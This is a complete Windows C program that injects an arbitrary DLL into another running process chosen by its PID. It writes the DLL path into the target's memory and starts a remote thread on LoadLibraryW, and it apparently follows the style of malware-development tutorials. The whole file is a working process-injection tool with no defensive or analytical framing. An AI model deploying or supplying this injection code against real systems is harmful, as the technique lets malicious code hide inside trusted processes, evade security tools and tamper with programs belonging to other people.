#include <windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
HMODULE hKernel32 = NULL;
LPVOID lpThreadProc = NULL;

wchar_t dllPath[MAX_PATH] = L"path\\to\\randomDLL.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[])
{
    okay("program startin");
    if (argc < 2)
    {
        info("usage: program.exe <PID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);


    okay("Getting handle to process (%ld)", PID);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL)
    {
        warn("failed to get a handle to process %ld, error: %ld", PID, GetLastError());
        return EXIT_FAILURE;
    }
    okay("Got handle 0x%p to process %ld", hProcess, PID);

    /* alloc bytes */
    okay("Allocating buffer on memory of process %ld", PID);
    lpThreadProc = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    okay("Allocated %zu bytes with PAGE_READWRITE perm", dllPathSize);

    /* write allocated mem to process mem */
    WriteProcessMemory(hProcess, lpThreadProc, dllPath, dllPathSize, NULL);
    okay("Wrote %S to process memory", dllPath);

    hKernel32 = GetModuleHandleW(L"Kernel32");

    if (hKernel32 == NULL)
    {
        warn("failed to get module handle, error:%ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    okay("got handle 0x%p to kernel32.dll!", hKernel32);

    LPTHREAD_START_ROUTINE start = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    hThread = CreateRemoteThread(hProcess, NULL, 0, start, lpThreadProc, 0, &TID);

    if (hThread == NULL)
    {
        warn("failed to get thread handle, error:%ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    okay("got handle 0x%p to thread %ld", hThread, TID);
    okay("waiting for thread...");

    WaitForSingleObject(hThread, INFINITE);
    okay("Done! cleaning up...");

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}
